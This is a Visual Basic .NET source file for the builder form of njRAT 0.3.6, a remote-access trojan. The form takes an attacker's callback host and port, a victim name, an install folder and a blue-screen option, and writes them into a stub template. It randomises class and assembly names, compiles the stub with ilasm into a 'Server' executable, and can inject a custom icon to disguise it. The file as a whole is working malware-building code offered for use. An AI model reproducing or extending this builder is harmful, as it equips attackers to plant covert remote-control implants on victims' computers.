Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports njRAT_0._3._6.njRAT

Public Class Builder
    Private ic As String
    Public Sub New()
        Me.ic = Nothing
        Me.InitializeComponent()
    End Sub

    Private Sub Builder_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.dir.SelectedIndex = 0
        Me.host.Text = FN.GTV("host", Me.host.Text)
        Me.port.Value = Conversions.ToDecimal(FN.GTV("p", Conversions.ToString(Me.port.Value)))
        Me.exe.Text = FN.GTV("exe", Me.exe.Text)
        Me.dir.SelectedIndex = Conversions.ToInteger(FN.GTV("dir", Conversions.ToString(Me.dir.SelectedIndex)))
        Me.VN.Text = FN.GTV("vn", Me.VN.Text)
        Me.bsod.Checked = Conversions.ToBoolean(FN.GTV("bsod", Me.bsod.Checked.ToString))
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim dialog As New SaveFileDialog
        dialog.Filter = "EXE|*.exe"
        dialog.FileName = "Server"
        If (dialog.ShowDialog = DialogResult.OK) Then
            Dim vN As TextBox = Me.VN
            Dim text As String = vN.Text
            vN.Text = [text]
            Dim contents As String = Strings.Replace(Strings.Replace(Strings.Replace(Strings.Replace(Strings.Replace(Strings.Replace(Strings.Replace(Strings.Replace(Strings.Replace(My.Resources.ASMNOM, "CLASSNOM", FN.RN(10), 1, -1, CompareMethod.Binary), "ASMNOM", FN.RN(10), 1, -1, CompareMethod.Binary), "#HOST", Me.host.Text, 1, -1, CompareMethod.Binary), "#PORT", Conversions.ToString(Me.port.Value), 1, -1, CompareMethod.Binary), "#VN", FN.ENB([text]), 1, -1, CompareMethod.Binary), "#EXE", Me.exe.Text, 1, -1, CompareMethod.Binary), "#BD#", Me.bsod.Checked.ToString, 1, -1, CompareMethod.Binary), "#DIR", Me.dir.Text.Replace("%", ""), 1, -1, CompareMethod.Binary), "#RG", FN.getMD5Hash((Me.dir.Text.Replace("%", "") & "\" & Me.exe.Text)), 1, -1, CompareMethod.Binary)
            Dim path As String = (Application.StartupPath & "\stub.IL")
            Dim str As String = (Application.StartupPath & "\stub.res")
            File.Delete(path)
            File.WriteAllText(path, contents)
            File.WriteAllBytes(str, My.Resources.ASMNOM1)
            Dim startInfo As New ProcessStartInfo
            startInfo.FileName = (Interaction.Environ("windir") & "\Microsoft.NET\Framework\V2.0.50727\ilasm.exe")
            startInfo.Arguments = String.Concat(New String() {"/output=""", dialog.FileName, """ """, path, """ /res:""", str, """"})
            Process.Start(startInfo).WaitForExit()
            File.Delete(path)
            File.Delete(str)
            If Me.CheckBox1.Checked Then
                ico.InjectIcon(dialog.FileName, Me.ic)
            End If
            FN.STV("host", Me.host.Text)
            FN.STV("p", Conversions.ToString(Me.port.Value))
            FN.STV("exe", Me.exe.Text)
            FN.STV("dir", Conversions.ToString(Me.dir.SelectedIndex))
            FN.STV("vn", Me.VN.Text)
            FN.STV("bsod", Me.bsod.Checked.ToString)
            Interaction.MsgBox(dialog.FileName, MsgBoxStyle.ApplicationModal, "DONE!")
            Me.Close()
        End If
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If Me.CheckBox1.Checked Then
            Dim dialog As New OpenFileDialog
            dialog.Filter = "Icon|*.ico"
            dialog.Title = "Choose Icon"
            dialog.FileName = ""
            If (dialog.ShowDialog = DialogResult.OK) Then
                Me.ic = dialog.FileName
                Me.PictureBox1.Image = Image.FromFile(Me.ic)
            End If
        Else
            Me.PictureBox1.Image = Nothing
        End If
    End Sub

    Private Sub port_ValueChanged(sender As Object, e As EventArgs) Handles port.ValueChanged
        If (Convert.ToDouble(Me.port.Value) <> Conversions.ToDouble(FN.GTV("port", Conversions.ToString(Me.port.Value)))) Then
            Me.port.Value = Conversions.ToDecimal(FN.GTV("port", Conversions.ToString(Me.port.Value)))
        End If
    End Sub
End Class